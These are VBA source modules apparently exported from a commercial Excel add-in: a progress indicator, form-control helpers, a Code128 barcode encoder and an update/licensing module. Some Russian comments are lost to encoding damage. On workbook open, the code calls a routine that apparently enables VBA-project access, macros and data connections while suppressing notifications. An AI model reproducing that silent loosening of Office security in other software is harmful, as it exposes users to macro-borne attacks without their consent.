    If Percent < 15 Then Exit Function
    dt = (Now - FPStartTime) * (100 - Percent) / Percent
    TimeToFinish$ = Format(dt, "H:NN:SS")
    TimeToFinish$ = MSG_EstimatedTime$ & ": " & TimeToFinish$
End Function

Sub SetFocus()
    FP.Show 0: If Position <> 0 Then Move Position
End Sub

Private Sub UpdateLabels(Optional ByVal L1_txt$, Optional ByVal L2_txt$, Optional ByVal L3_txt$)
    If Len(L1_txt$) > 0 Then FP.L1.Caption = ProcessLabel(L1_txt$)
    If Len(L1_txt$) + Len(L2_txt$) > 0 Then FP.L2.Caption = ProcessLabel(L2_txt$)
    If Len(L1_txt$) + Len(L2_txt$) + Len(L3_txt$) > 0 Then FP.L3.Caption = ProcessLabel(L3_txt$)
End Sub

Private Function ProcessLabel$(ByVal txt$)
    If txt Like "*$index*" Then txt = Replace(txt, "$index", SubActionIndex)
    If txt Like "*$count*" Then txt = Replace(txt, "$count", SubActionsCount)
    If txt Like "*$time*" Then txt = Replace(txt, "$time", TimeToFinish)
    ProcessLabel = txt
End Function

Sub SubAction(Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "")
    On Error Resume Next
    If SubActionsCount = 0 Then SubActionsCount = 1
    SubActionIndex = SubActionIndex + 1 * SubActionsStep
    If SubActionIndex > SubActionsCount Then SubActionIndex = SubActionsCount
    Percent = PrS + (PrE - PrS) * ((SubActionIndex - 1) / SubActionsCount)
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar Percent: DoEvents
End Sub

Sub StartNewAction(Optional ByVal Pr_Start& = 0, Optional ByVal Pr_End& = 100, _
                   Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = " ", Optional ByVal L3_txt$ = " ", _
                   Optional ByVal Actions_Count& = 0)
    On Error Resume Next
    PrS = Pr_Start: PrE = Pr_End: SubActionIndex = 0: SubActionsCount = Actions_Count
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar PrS
End Sub

Sub UpdateFromChild(ByVal ChildPercent As Double)
    If SubActionsCount = 0 Then
        Percent = PrS + (PrE - PrS) * (ChildPercent / 100)
    Else
        Percent = PrS + (PrE - PrS) / SubActionsCount * (SubActionIndex - 1) + (PrE - PrS) / SubActionsCount * (ChildPercent / 100)
    End If
    Set_ProgressBar Percent
End Sub

Private Sub Set_ProgressBar(ByVal NewPercent As Double)
    On Error Resume Next: Percent = NewPercent
    If NewPercent > 100 Then Percent = 100
    If NewPercent < 0 Then Percent = 0
    FP.PrBar.Width = Int(Percent * ProgressBar_Default_Width / 100)
    SetProgressFormCaption
    FP.Repaint
    If Not Parent Is Nothing Then Parent.UpdateFromChild Percent
End Sub

Private Sub Class_Terminate()
    On Error Resume Next
    Unload FP: FPVisible = False
    Set FP = Nothing: Set Children = Nothing: Set Parent = Nothing
End Sub

Private Function ProgressBar_Default_Width() As Double
    ProgressBar_Default_Width = FP.Width - 18
End Function

Function CancelButton() As MSForms.CommandButton
    Set CancelButton = FP.CommandButton_stop
End Function

Sub SetLogSize(ByVal n&)
    On Error Resume Next
    If n < 0 Then n = 0
    If n > 5 Then n = 5
    FP.SpinButton_log.Value = n
    FP.SpinButton_log.Visible = n > 0
End Sub

Sub Log(ByVal txt$, Optional ByVal MaxLen& = 0)
    On Error Resume Next: Dim currtime$, newtext$
    If ShowTimeInLog Then currtime$ = Time & vbTab
    LogString = LogString & vbNewLine & currtime$ & txt
    newtext$ = Mid(LogString, 3): If MaxLen& Then newtext$ = Right(newtext$, MaxLen&)
    FP.TextBox_Log.Text = newtext$
    If FP.SpinButton_log.Value = 0 Then FP.SpinButton_log.Value = 2: FP.SpinButton_log.Visible = True
    FP.CommandButton_stop.SetFocus: FP.TextBox_Log.SetFocus
End Sub

Sub ClearLog()
    LogString = "": FP.TextBox_Log.Text = ""
End Sub

Sub ShowLog()
    On Error Resume Next: Dim filename$
    filename$ = Environ("TEMP") & "\macro_log.txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write Mid(LogString, 3): .Close
    End With
    FollowHyperlink """" & filename$ & """"
End Sub

Sub AddButton(ByVal Caption$, ByVal Macro$)
    Const dd& = 18
    If FP.SpinButton_log = 0 Then FP.SpinButton_log = 1
    With Me.FP.CommandButton_RunMacro
        .Caption = Caption$
        .Visible = True
        .Top = FP.Height - .Height - dd - 20
        .Left = FP.Width - .Width - dd - 15
    End With
    FP.ButtonMacro = Macro$
End Sub

Function MacroButton() As MSForms.CommandButton
    Set MacroButton = FP.CommandButton_RunMacro
End Function

Sub QueryClose()
    On Error Resume Next
    Dim pi As ProgressIndicator
    For Each pi In Children
        pi.QueryClose
        pi.Hide
    Next pi
End Sub


Attribute VB_Name = "SpecialControl"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : SpecialControl                    Version: 2.2
' Author        : Igor Vakhnenko                   Date: 09.06.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Public WithEvents Scroller As MSForms.ScrollBar
Attribute Scroller.VB_VarHelpID = -1
Public WithEvents ScrolledCombo As MSForms.ComboBox
Attribute ScrolledCombo.VB_VarHelpID = -1
Dim ScrollEventEnabled As Boolean

Public WithEvents MainCheckboxInFrame As MSForms.CheckBox
Attribute MainCheckboxInFrame.VB_VarHelpID = -1
'Public WithEvents FontSelectCombo As MSForms.ComboBox
Public WithEvents ColorSelectCombo As MSForms.ComboBox
Attribute ColorSelectCombo.VB_VarHelpID = -1
Public WithEvents KeyNameTexbox As MSForms.TextBox
Attribute KeyNameTexbox.VB_VarHelpID = -1
Public WithEvents NumericTexbox As MSForms.TextBox
Attribute NumericTexbox.VB_VarHelpID = -1

Private Sub NumericTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    On Error Resume Next
    Select Case KeyAscii
        Case 48 To 57, 8
        Case Else: KeyAscii = 0
    End Select
End Sub

' -----------------------------------------------------------------------------------

'Private Sub FontSelectCombo_Change()
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo)
'        .ApplyToSettingsField Me.FontSelectCombo
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub
'
'Private Sub FontSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo): .PickNewFont
'        Me.FontSelectCombo = .ExportToText
'
'        Dim UF As Object: Set UF = Me.FontSelectCombo
'        While TypeName(UF) <> "UserForm": Set UF = UF.Parent: Wend
'        UF.Show
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub

' -----------------------------------------------------------------------------------
'Private Sub KeyNameTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
'    KeyAscii = 0
'End Sub
'Private Sub KeyNameTexbox_KeyUp(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
'    On Error Resume Next: Button$ = GetKeyName(KeyCode, Shift)
'    If Len(Button$) Then KeyCode = 0: Me.KeyNameTexbox = Button$
'End Sub
' -----------------------------------------------------------------------------------
'Private Sub ColorSelectCombo_Change()
'    On Error Resume Next: clr& = Val(Me.ColorSelectCombo)
'    If clr& >= 0 Then
'        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
'    Else
'         clr& = vbButtonFace
'        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
'    End If
'End Sub
'
'Private Sub ColorSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal y As Single)
'    On Error Resume Next: clr& = PickNewColor(IIf(Me.ColorSelectCombo = "", xlNone, Val(Me.ColorSelectCombo)))
'    Me.ColorSelectCombo = clr&
'End Sub

' -----------------------------------------------------------------------------------
Private Sub MainCheckboxInFrame_Change()
    On Error Resume Next: Err.Clear
    Dim fr As MSForms.Frame, ctrl As MSForms.Control: Set fr = Me.MainCheckboxInFrame.Parent
    If Err <> 0 Or (fr Is Nothing) Then Exit Sub        'MsgBox "MainCheckboxInFrame.Parent is not frame control": Exit Sub
    For Each ctrl In fr.Controls
        If ctrl.Name <> Me.MainCheckboxInFrame.Name Then
            'If ctrl.Parent Is fr Then
            ctrl.Enabled = Me.MainCheckboxInFrame.Value
        End If
    Next
End Sub
' -----------------------------------------------------------------------------------
Function FieldFound() As Boolean
    On Error Resume Next
    If Not ScrolledCombo Is Nothing Then FieldFound = True: Exit Function
    ScrollEventEnabled = False: Me.Scroller.Value = 1: ScrollEventEnabled = True
    Dim ctrl As MSForms.Control
    For Each ctrl In Me.Scroller.Parent.Controls
        If TypeName(ctrl) = "ComboBox" Then
            If ctrl.Top < Scroller.Top And ctrl.Left < Scroller.Left And _
               ctrl.Top + ctrl.Height > Scroller.Top + Scroller.Height And ctrl.Left + ctrl.Width > Scroller.Left + Scroller.Width Then
                Set ScrolledCombo = ctrl
                FieldFound = True: Exit Function
            End If
        End If
    Next
    MsgBox "Combo not found", , Me.Scroller.Name
End Function

Private Sub Scroller_Change()
    On Error Resume Next: If Not Me.FieldFound Then Exit Sub
    If Not ScrollEventEnabled Then Exit Sub
    Select Case Me.Scroller.Value
        Case 0: Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex + 1
        Case 2: If Me.ScrolledCombo.ListIndex > 0 Then Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex - 1
    End Select
    ScrollEventEnabled = False: Me.Scroller.Value = 1: ScrollEventEnabled = True
End Sub

Attribute VB_Name = "ThisWB"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 25.12.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    If Not Developer Then ThisWorkbook.Saved = True

    DeleteProgramCommandBar
End Sub

Private Sub Workbook_Open()
    On Error Resume Next: Dim FirstRun As Boolean
    FirstRun = SETT.IsFirstRun
    If FirstRun Then ShowFirstRunForm
    If SetupCancelled Then
        Application.DisplayAlerts = False
        If TrueDeveloper Then MsgBox "Setup Cancelled", vbInformation Else ThisWorkbook.Close False
        Application.DisplayAlerts = True
        Exit Sub
    End If
    Enable_AccessVBOM_Macro_DataConnections        ' disables notifications
    SaveSetting PROJECT_NAME$, "Setup", "AddinPath", ThisWorkbook.FullName
    If FirstRun Then CreateTemplateSamplesOnFirstRun
    CreateProgramCommandBar 0
End Sub

Attribute VB_Name = "clsCode128"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
' ***    Made By Michael Ciurescu (CVMichael)   ***
'Modified by Paulo Cunha (pcunha) to work with char128.ttf on word or excel on 16/05/2011
'the font at in http://grandzebu.net/index.php?page=/informatique/codbar-en/code128.htm


' References:
' http://www.barcodeman.com/info/c128.php3

Private Enum eCode128Type
    eCode128_CodeSetA = 1
    eCode128_CodeSetB = 2
    eCode128_CodeSetC = 3
End Enum

Private Type tCode
    ASet As String
    BSet As String
    CSet As String
    BarSpacePattern As String
End Type

Private CodeArr() As tCode

Private Sub Class_Initialize()
    ReDim CodeArr(106)

    AddEntry 0, " ", " ", "00", Chr(32)
    AddEntry 1, "!", "!", "01", Chr(33)
    AddEntry 2, """", """", "02", Chr(34)
    AddEntry 3, "#", "#", "03", Chr(35)
    AddEntry 4, "$", "$", "04", Chr(36)
    AddEntry 5, "%", "%", "05", Chr(37)
    AddEntry 6, "&", "&", "06", Chr(38)
    AddEntry 7, "'", "'", "07", Chr(39)
    AddEntry 8, "(", "(", "08", Chr(40)
    AddEntry 9, ")", ")", "09", Chr(41)
    AddEntry 10, "*", "*", "10", Chr(42)
    AddEntry 11, "+", "+", "11", Chr(43)
    AddEntry 12, ",", ",", "12", Chr(44)
    AddEntry 13, "-", "-", "13", Chr(45)
    AddEntry 14, ".", ".", "14", Chr(46)
    AddEntry 15, "/", "/", "15", Chr(47)
    AddEntry 16, "0", "0", "16", Chr(48)
    AddEntry 17, "1", "1", "17", Chr(49)
    AddEntry 18, "2", "2", "18", Chr(50)
    AddEntry 19, "3", "3", "19", Chr(51)
    AddEntry 20, "4", "4", "20", Chr(52)
    AddEntry 21, "5", "5", "21", Chr(53)
    AddEntry 22, "6", "6", "22", Chr(54)
    AddEntry 23, "7", "7", "23", Chr(55)
    AddEntry 24, "8", "8", "24", Chr(56)
    AddEntry 25, "9", "9", "25", Chr(57)
    AddEntry 26, ":", ":", "26", Chr(58)
    AddEntry 27, ";", ";", "27", Chr(59)
    AddEntry 28, "<", "<", "28", Chr(60)
    AddEntry 29, "=", "=", "29", Chr(61)
    AddEntry 30, ">", ">", "30", Chr(62)
    AddEntry 31, "?", "?", "31", Chr(63)
    AddEntry 32, "@", "@", "32", Chr(64)
    AddEntry 33, "A", "A", "33", Chr(65)
    AddEntry 34, "B", "B", "34", Chr(66)
    AddEntry 35, "C", "C", "35", Chr(67)
    AddEntry 36, "D", "D", "36", Chr(68)
    AddEntry 37, "E", "E", "37", Chr(69)
    AddEntry 38, "F", "F", "38", Chr(70)
    AddEntry 39, "G", "G", "39", Chr(71)
    AddEntry 40, "H", "H", "40", Chr(72)
    AddEntry 41, "I", "I", "41", Chr(73)
    AddEntry 42, "J", "J", "42", Chr(74)
    AddEntry 43, "K", "K", "43", Chr(75)
    AddEntry 44, "L", "L", "44", Chr(76)
    AddEntry 45, "M", "M", "45", Chr(77)
    AddEntry 46, "N", "N", "46", Chr(78)
    AddEntry 47, "O", "O", "47", Chr(79)
    AddEntry 48, "P", "P", "48", Chr(80)
    AddEntry 49, "Q", "Q", "49", Chr(81)
    AddEntry 50, "R", "R", "50", Chr(82)
    AddEntry 51, "S", "S", "51", Chr(83)
    AddEntry 52, "T", "T", "52", Chr(84)
    AddEntry 53, "U", "U", "53", Chr(85)
    AddEntry 54, "V", "V", "54", Chr(86)
    AddEntry 55, "W", "W", "55", Chr(87)
    AddEntry 56, "X", "X", "56", Chr(88)
    AddEntry 57, "Y", "Y", "57", Chr(89)
    AddEntry 58, "Z", "Z", "58", Chr(90)
    AddEntry 59, "[", "[", "59", Chr(91)
    AddEntry 60, "\", "\", "60", Chr(92)
    AddEntry 61, "]", "]", "61", Chr(93)
    AddEntry 62, "^", "^", "62", Chr(94)
    AddEntry 63, "_", "_", "63", Chr(95)
    AddEntry 64, Chr(0), "`", "64", Chr(96) ' Null
    AddEntry 65, Chr(1), "a", "65", Chr(97) ' SOH
    AddEntry 66, Chr(2), "b", "66", Chr(98) ' STX
    AddEntry 67, Chr(3), "c", "67", Chr(99) ' ETX
    AddEntry 68, Chr(4), "d", "68", Chr(100) ' EOT
    AddEntry 69, Chr(5), "e", "69", Chr(101) ' ENQ
    AddEntry 70, Chr(6), "f", "70", Chr(102) ' ACK
    AddEntry 71, Chr(7), "g", "71", Chr(103) ' BEL
    AddEntry 72, Chr(8), "h", "72", Chr(104) ' BS
    AddEntry 73, Chr(9), "i", "73", Chr(105) ' HT
    AddEntry 74, Chr(10), "j", "74", Chr(106) ' LF
    AddEntry 75, Chr(11), "k", "75", Chr(107) ' VT
    AddEntry 76, Chr(12), "l", "76", Chr(108) ' FF
    AddEntry 77, Chr(13), "m", "77", Chr(109) ' CR
    AddEntry 78, Chr(14), "n", "78", Chr(110) ' SO
    AddEntry 79, Chr(15), "o", "79", Chr(111) ' SI
    AddEntry 80, Chr(16), "p", "80", Chr(112) ' DLE
    AddEntry 81, Chr(17), "q", "81", Chr(113) ' DC1
    AddEntry 82, Chr(18), "r", "82", Chr(114) ' DC2
    AddEntry 83, Chr(19), "s", "83", Chr(115) ' DC3
    AddEntry 84, Chr(20), "t", "84", Chr(116) ' DC4
    AddEntry 85, Chr(21), "u", "85", Chr(117) ' NAK
    AddEntry 86, Chr(22), "v", "86", Chr(118) ' SYN
    AddEntry 87, Chr(23), "w", "87", Chr(119) ' ETB
    AddEntry 88, Chr(24), "x", "88", Chr(120) ' CAN
    AddEntry 89, Chr(25), "y", "89", Chr(121) ' EM
    AddEntry 90, Chr(26), "z", "90", Chr(122) ' SUB
    AddEntry 91, Chr(27), "{", "91", Chr(123) ' ESC
    AddEntry 92, Chr(28), "|", "92", Chr(124) ' FS
    AddEntry 93, Chr(29), "}", "93", Chr(125) ' GS
    AddEntry 94, Chr(30), "~", "94", Chr(126) ' RS
    AddEntry 95, Chr(31), Chr(127), "95", Chr(200) ' US, DEL
    AddEntry 96, "FNC 3", "FNC 3", "96", Chr(201)
    AddEntry 97, "FNC 2", "FNC 2", "97", Chr(202)
    AddEntry 98, "SHIFT", "SHIFT", "98", Chr(203)
    AddEntry 99, "CODE C", "CODE C", "99", Chr(204)
    AddEntry 100, "CODE B", "FNC 4", "CODE B", Chr(205)
    AddEntry 101, "FNC 4", "CODE A", "CODE A", Chr(206)
    AddEntry 102, "FNC 1", "FNC 1", "FNC 1", Chr(207)
    AddEntry 103, "Start A", "Start A", "Start A", Chr(208)
    AddEntry 104, "Start B", "Start B", "Start B", Chr(209)
    AddEntry 105, "Start C", "Start C", "Start C", Chr(210)
    AddEntry 106, "Stop", "Stop", "Stop", Chr(211)
End Sub

Private Sub AddEntry(ByVal Index As Integer, ASet As String, BSet As String, CSet As String, BarSpacePattern As String)
    With CodeArr(Index)
        .ASet = ASet
        .BSet = BSet
        .CSet = CSet
        .BarSpacePattern = Replace(BarSpacePattern, " ", "")
    End With
End Sub

Public Function Code128_Str(ByVal Str As String)
    Code128_Str = Replace(BuildStr(Str), " ", "")
End Function

Private Function BuildStr(ByVal Str As String) As String
    Dim SCode As eCode128Type, PrevSCode As eCode128Type
    Dim CurrChar As String, ArrIndex As Integer, CharIndex As Long
    Dim CheckDigit As Integer, CCodeIndex As Integer, TotalSum As Long

    SCode = eCode128_CodeSetB
    If Str Like "##*" Then SCode = eCode128_CodeSetC

    TotalSum = 0
    CharIndex = 1

    Select Case SCode
    Case eCode128_CodeSetA
        TotalSum = TotalSum + (103 * CharIndex)
        BuildStr = Trim(BuildStr) & Chr(208)
    Case eCode128_CodeSetB
        TotalSum = TotalSum + (104 * CharIndex)
        BuildStr = Trim(BuildStr) & Chr(209)
    Case eCode128_CodeSetC
        TotalSum = TotalSum + (105 * CharIndex)
        BuildStr = Trim(BuildStr) & Chr(210)
    End Select

    PrevSCode = SCode

    Do Until Len(Str) = 0
        If Str Like "####*" Then SCode = eCode128_CodeSetC

        If SCode = eCode128_CodeSetC And Mid(Str, 1, 2) Like "##" Then
            CurrChar = Mid(Str, 1, 2)
        Else
            CurrChar = Mid(Str, 1, 1)
        End If

        ArrIndex = GetCharIndex(CurrChar, SCode, True)

        If ArrIndex <> -1 Then
            If CodeArr(ArrIndex).BSet = CurrChar And ((SCode = eCode128_CodeSetC And CodeArr(ArrIndex).CSet <> CurrChar) Or (SCode = eCode128_CodeSetA And CodeArr(ArrIndex).ASet <> CurrChar)) Then
                SCode = eCode128_CodeSetB
            ElseIf CodeArr(ArrIndex).ASet = CurrChar And CodeArr(ArrIndex).BSet <> CurrChar Then
                SCode = eCode128_CodeSetA
            ElseIf CodeArr(ArrIndex).CSet = CurrChar Then
                SCode = eCode128_CodeSetC
            End If

            If PrevSCode <> SCode Then
                Select Case SCode
                Case eCode128_CodeSetA
                    CCodeIndex = GetCharIndex("CODE A", PrevSCode, False)
                Case eCode128_CodeSetB
                    CCodeIndex = GetCharIndex("CODE B", PrevSCode, False)
                Case eCode128_CodeSetC
                    CCodeIndex = GetCharIndex("CODE C", PrevSCode, False)
                End Select

                TotalSum = TotalSum + (CCodeIndex * CharIndex)
                BuildStr = Trim(BuildStr) & CodeArr(CCodeIndex).BarSpacePattern

                CharIndex = CharIndex + 1
                PrevSCode = SCode
            End If

            BuildStr = Trim(BuildStr) & CodeArr(ArrIndex).BarSpacePattern

            TotalSum = TotalSum + (ArrIndex * CharIndex)
            CharIndex = CharIndex + 1
        End If

        If SCode = eCode128_CodeSetC Then
            Str = Mid(Str, 3)
        Else
            Str = Mid(Str, 2)
        End If
    Loop

    CheckDigit = TotalSum Mod 103

    BuildStr = Trim(BuildStr) & CodeArr(CheckDigit).BarSpacePattern
    BuildStr = Trim(BuildStr) & Chr(211)
End Function

Private Function GetCharIndex(ByVal Char As String, ByVal CodeType As eCode128Type, ByVal Recurse As Boolean) As Integer
    Dim K As Long

    Select Case CodeType
    Case eCode128_CodeSetA
        For K = 0 To UBound(CodeArr)
            If Char = CodeArr(K).ASet Then Exit For
        Next K
    Case eCode128_CodeSetB
        For K = 0 To UBound(CodeArr)
            If Char = CodeArr(K).BSet Then Exit For
        Next K
    Case eCode128_CodeSetC
        For K = 0 To UBound(CodeArr)
            If Char = CodeArr(K).CSet Then Exit For
        Next K
    End Select

    If K = UBound(CodeArr) + 1 Then
        If Not Recurse Then
            GetCharIndex = -1
        Else
            Select Case CodeType
            Case eCode128_CodeSetA
                GetCharIndex = GetCharIndex(Char, eCode128_CodeSetC, False)
            Case eCode128_CodeSetB
                GetCharIndex = GetCharIndex(Char, eCode128_CodeSetA, False)
            Case eCode128_CodeSetC
                GetCharIndex = GetCharIndex(Char, eCode128_CodeSetB, False)
            End Select

            If GetCharIndex = -1 Then
                Select Case CodeType
                Case eCode128_CodeSetA
                    GetCharIndex = GetCharIndex(Char, eCode128_CodeSetB, False)
                Case eCode128_CodeSetB
                    GetCharIndex = GetCharIndex(Char, eCode128_CodeSetC, False)
                Case eCode128_CodeSetC
                    GetCharIndex = GetCharIndex(Char, eCode128_CodeSetA, False)
                End Select
            End If
        End If
    Else
        GetCharIndex = K
    End If
End Function

Public Function Code128_GetWidth(ByVal Str As String, Optional ByVal BarWidth As Integer = 1) As Long
    Dim K As Long, Width As Long

    Str = Replace(Code128_Str(Str), " ", "")
    Debug.Print Str
    For K = 1 To Len(Str)
        Width = Width + Val(Mid(Str, K, 1))
    Next K

    Code128_GetWidth = Width * BarWidth + (28 * BarWidth)
End Function



Attribute VB_Name = "mod_About_NEW"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW                    Version: 2.5
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module
Public Const DEBUG_MODE As Boolean = False        'True
Public Const UPDATES_HYPERLINK$ = "http://ExcelVBA.ru/php2/updates.php"

Public Const DEVELOPER_WEBSITE$ = "http://ExcelVBA.ru/"        '"http://Excel-Automation.com/"
Public Const SUPPORT_EMAIL_RUS$ = "info@ExcelVBA.ru", SUPPORT_EMAIL$ = "support@Excel-Automation.com"
Public Const BUY_NEW_HYPERLINK$ = "%website%buy/add-in?name=%projectname%"
Public Const BUY_ADD_HYPERLINK$ = "%website%buy2/add-in?name=%projectname%"
Public Const UNINSTALL_HYPERLINK$ = "%website%uninstall/program?name=%projectname%"
Public Const EULA_HYPERLINK$ = "%website%buy/EULA?name=%projectname%"
Public Const BREACH_EULA_HYPERLINK$ = "%website%buy/EULA/breach?name=%projectname%"
Public Const CABINET_HYPERLINK$ = "%website%cabinet/login"
Public Const VERSIONS_HISTORY_HYPERLINK$ = "%website%updates/history.php?addin=%projectname%"
Public SetupCancelled As Boolean, StopMacro As Boolean

Public Const CFA_NAME$ = "'CommonFunctions.xla'!"
Public Enum CONTROL_TYPES
    ct_BUTTON = msoControlButton: ct_TEXTBOX = msoControlEdit: ct_COMBOBOX = msoControlComboBox
    ct_DROPDOWN = msoControlDropdown: ct_POPUP = msoControlPopup
End Enum

#If Win64 Then
    Private Declare PtrSafe Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As LongPtr) As LongPtr
#Else
    Private Declare Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As Long) As Long
#End If

Sub ActivateAddinsTab()
    On Error Resume Next: Dim TabName$
    Select Case Application.LanguageSettings.LanguageID(msoLanguageIDUI)
        Case 1049: TabName$ = SETT.U("CDE0E4F1F2F0EEE9EAE8")        '"|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 1033: TabName$ = "Add-Ins"
    End Select
    If Len(TabName$) Then SwitchTab TabName$
End Sub


Sub Add3Buttons(ByRef AddinMenu As Object)
    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    Add_Control AddinMenu, ct_BUTTON, 222, "ShowSettingsPage", tt("MENU_Settings") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, 487, "ShowMainForm", tt("MENU_About") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, IIf(Val(Application.Version) <= 11, 4356, 923), "ExitProgram", tt("MENU_Exit"), msoButtonIcon, True
End Sub

Function Add_Control(ByRef Comm_Bar, ByVal ControlType As CONTROL_TYPES, Optional ByVal B_Face&, Optional ByVal On_Action$, _
                     Optional ByVal B_Caption$, Optional ByVal Button_Style As Long = msoButtonIcon, _
                     Optional ByVal Begin_Group As Boolean = False, Optional Tag = "") As CommandBarControl
    On Error Resume Next
    Set Add_Control = Comm_Bar.Controls.Add(Type:=ControlType, Temporary:=True)
    With Add_Control
        If B_Face > 0 And ControlType = ct_BUTTON Then .FaceId = B_Face
        If Len(On_Action) Then
            .Tag = TWN & On_Action & "\\\" & Tag
            .OnAction = TWN & "RunMacroFromButton": If On_Action Like "Exit*" Then .OnAction = TWN & On_Action
        End If
        .Caption = B_Caption
        .BeginGroup = Begin_Group
        If ControlType = ct_BUTTON Or ControlType = ct_DROPDOWN Then .Style = Button_Style
    End With
End Function

Private Sub RunMacroFromButton()
    On Error Resume Next: Dim Macro$, param$
    Macro$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(0)
    param$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(1)
    If Macro$ Like TWN & "*" Then SETT.LastMacro Macro$
    If Len(Macro$) > O Then If Len(param$) Then Run Macro$, param$ Else Run Macro$
End Sub

Function GetCommandBar(ByVal CommandBarName As String, Optional ByVal Clean As Boolean = False, _
                       Optional ByVal Position As MsoBarPosition = msoBarTop) As CommandBar
    On Error Resume Next: Err.Clear: Dim cbc As Object
    Set GetCommandBar = Application.CommandBars(CommandBarName)
    If Err.Number Then
        Set GetCommandBar = Application.CommandBars.Add(CommandBarName, Position, False, True)
    End If
    If Clean Then
        GetCommandBar.Visible = False
        For Each cbc In GetCommandBar.Controls: cbc.Delete: Next
    End If
    GetCommandBar.Visible = True
End Function

Function DeleteProgramCommandBar()
    On Error Resume Next: GetCommandBar(PROJECT_NAME).Visible = False
End Function

Function SetIsAddinAsFalse()
    On Error Resume Next: ThisWorkbook.IsAddin = False
End Function
Function SetIsAddinAsTrue()
    On Error Resume Next: ThisWorkbook.IsAddin = True
End Function

'Sub ComboChanged()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    On Error Resume Next
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Tag
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Text
'    MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """", _
     '           vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd| """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """"
'End Sub
